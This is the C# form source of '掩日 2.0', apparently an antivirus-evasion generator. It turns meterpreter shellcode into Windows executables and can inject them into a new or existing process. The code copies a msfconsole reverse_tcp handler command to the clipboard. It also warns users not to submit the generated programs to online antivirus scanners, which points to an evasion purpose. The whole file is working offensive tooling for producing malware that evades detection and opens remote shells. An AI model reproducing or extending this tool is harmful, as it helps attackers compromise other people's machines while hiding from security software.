using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace 掩日2._0
{
    public partial class Form1 : Form
    {
        //全局变量
        public bool MODE = true; // true for easy mode which is default, false for custom mode
        public bool ENV = true;  //true for GCC installed

        public Form1()
        {
            InitializeComponent();
            this.Height = 110;
            bool env = false;
            comboBox1.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;
            comboBox5.Items.AddRange(Global.VM_Sandbox);
            comboBox5.SelectedIndex = 0;
            //判断是否已安装GCC
            if (!Common.Execute_Cmd("gcc --version").Contains("tdm64"))
            {
                DialogResult result = MessageBox.Show("缺少必要的执行环境(tdm-gcc)，点击确定将启动兼容模式，兼容模式下，多数功能无法使用。点击取消打开使用说明界面", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation);
                if (result == DialogResult.OK)
                {
                    this.Text = "掩日 2.0 - 兼容 - 1y0n.com";
                    ENV = false; // 没有安装GCC
                    MODE = false; //环境不全的情况下，极简模式不能用
                    linkLabel1.Text = "";
                    panel1.Height = 410;
                    panel1.Visible = true;
                    this.Height = 519;
                    textBox1.Enabled = false;
                    comboBox1.Items.Clear();
                    comboBox1.Items.Add("C#");
                    comboBox1.SelectedIndex = 0;
                    linkLabel1.Enabled = false;
                    textBox1.Text = "兼容模式下不可用";
                    textBox1.Enabled = false;
                }
                else 
                {
                    System.Diagnostics.Process.Start("https://github.com/1y0n/AV_Evasion_Tool/");
                    System.Environment.Exit(-1);
                }
            }
        }

        private void label3_Click(object sender, EventArgs e)
        {
            AboutBox1 ab = new AboutBox1();
            ab.Show();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (MODE) //极简模式
            {
                if (textBox1.Text.Contains(":"))
                {
                    string ip = textBox1.Text.Split(':')[0];
                    string port = textBox1.Text.Split(':')[1];
                    saveFileDialog1.Filter = "可执行文件|*.exe";
                    if ((saveFileDialog1.ShowDialog() == DialogResult.OK) && (saveFileDialog1.FileName != ""))
                    {
                        string savepath = saveFileDialog1.FileName;
                        if (Core.Generate_1_IP(comboBox3.Text, ip, port, savepath))
                        {
                            if (MessageBox.Show("生成成功，是否复制 metasploit 启动命令到剪贴板？", "成功", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                string msf_cmd = @"msfconsole -x ""use exploit/multi/handler; set payload windows/{{arch}}meterpreter/reverse_tcp; set lhost {{ip}}; set lport {{port}}; run; """;
                                string temp = comboBox3.Text.StartsWith("64") ? "x64/" : "";
                                msf_cmd = msf_cmd.Replace("{{arch}}", temp).Replace("{{ip}}", ip).Replace("{{port}}", port);
                                Clipboard.SetText(msf_cmd);
                            }
                        }
                        else
                        {
                            MessageBox.Show("生成失败，请检查你的输入。");
                        }
                    }
                    else
                    {
                        MessageBox.Show("必须按照 IP:端口 的形式，如 192.168.1.1:4444 ,输入地址。");
                        return;
                    }
                }
                else
                {
                    MessageBox.Show("必须按照 IP:端口 的形式，如 192.168.1.1:4444 ,输入地址。");
                    return;
                }
            }
            else
            {
                if (comboBox2.Text.Contains("注入"))
                {
                    if (textBox2.Text.Trim() == "")
                    {
                        MessageBox.Show("漏填了必填项，请检查", "提示");
                        return;
                    }
                    if (comboBox2.Text.Contains("现有"))
                    {
                        try
                        {
                            int temp = int.Parse(textBox2.Text);
                        }
                        catch
                        {
                            MessageBox.Show("注入现有进程时必须填写数字PID号", "提示");
                            return;
                        }
                    }
                }
                saveFileDialog1.Filter = "可执行文件|*.exe";
                if ((saveFileDialog1.ShowDialog() == DialogResult.OK) && (saveFileDialog1.FileName != "") && (richTextBox1.Text.Trim() != ""))
                {
                    bool result = false;
                    if (comboBox1.Text == "C")
                    {
                        result = Core.Gen_C(richTextBox1.Text, saveFileDialog1.FileName, comboBox2.Text, textBox2.Text, comboBox3.Text, comboBox5.Text);
                    }
                    else if (comboBox1.Text == "C#")
                    {
                        result = Core.Gen_CS(richTextBox1.Text, saveFileDialog1.FileName, comboBox2.Text, textBox2.Text, comboBox3.Text, comboBox5.Text);
                    }
                    if (result)
                    {
                        MessageBox.Show("生成成功！不要将生成的程序上传到在线杀毒网站", "成功");
                        return;
                    }
                    else
                    {
                        MessageBox.Show("生成失败！请检查你的输入", "失败");
                        return;
                    }
                }
                else
                {
                    return;
                }
            }
        }

        public void SwitchMode()
        {
            if (MODE) // 当前是极简模式，准备切换到进阶模式
            {
                MODE = false;
                linkLabel1.Text = "🔺极简";
                panel1.Height = 410;
                panel1.Visible = true;
                this.Height = 519;
                textBox1.Enabled = false;
            }
            else //切换到极简模式
            {
                MODE = true;
                linkLabel1.Text = "🔻进阶";
                panel1.Visible = false;
                this.Height = 110;
                textBox1.Enabled = true;
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            SwitchMode();
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            richTextBox1.ForeColor = Color.Black;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.Text == "C")
            {
                comboBox2.Items.Clear();
                comboBox2.Items.AddRange(Global.C_Execute);
                comboBox2.SelectedIndex = 0;
            }
            else if (comboBox1.Text == "C#")
            {
                comboBox2.Items.Clear();
                if (comboBox3.Text.StartsWith("32"))
                {
                    comboBox2.Items.AddRange(Global.CS_Execute_x86);
                }
                else
                {
                    comboBox2.Items.AddRange(Global.CS_Execute_x64);
                }
                comboBox2.SelectedIndex = 0;
            }
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox2.Text.Contains("注入新进程"))
            {
                textBox2.Enabled = true;
                label4.Text = "注入进程名:";
                textBox2.Text = "notepad.exe";
            }
            else if (comboBox2.Text.Contains("注入现有进程"))
            {
                textBox2.Enabled = true;
                label4.Text = "进程PID:";
                textBox2.Clear();
            }
            else 
            {
                textBox2.Enabled = false;
            }
        }

        private void radioButton6_CheckedChanged(object sender, EventArgs e)
        {
            if (!radioButton6.Checked)
            {
                return;
            }
            MessageBox.Show("图标路径不要包含中文，否则无法生成", "提示");
            openFileDialog1.Filter = "图标文件|*.ico";
            if ((openFileDialog1.ShowDialog() == DialogResult.OK) && (openFileDialog1.FileName != ""))
            {
                pictureBox3.ImageLocation = Global.ICONPATH = openFileDialog1.FileName;
            }
            else
            {
                radioButton3.Checked = true;
            }
        }

        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.Text == "C#")
            {
                comboBox2.Items.Clear();
                if (comboBox3.Text.StartsWith("32"))
                {
                    comboBox2.Items.AddRange(Global.CS_Execute_x86);
                }
                else
                {
                    comboBox2.Items.AddRange(Global.CS_Execute_x64);
                }
                comboBox2.SelectedIndex = 0;
            }
        }

        private void richTextBox1_Click(object sender, EventArgs e)
        {
            if (richTextBox1.Text.Contains("msfvenom"))
            {
                richTextBox1.Clear();
            }
        }

        private void radioButton3_CheckedChanged(object sender, EventArgs e)
        {
            Global.ICONPATH = "";
        }
    }
}
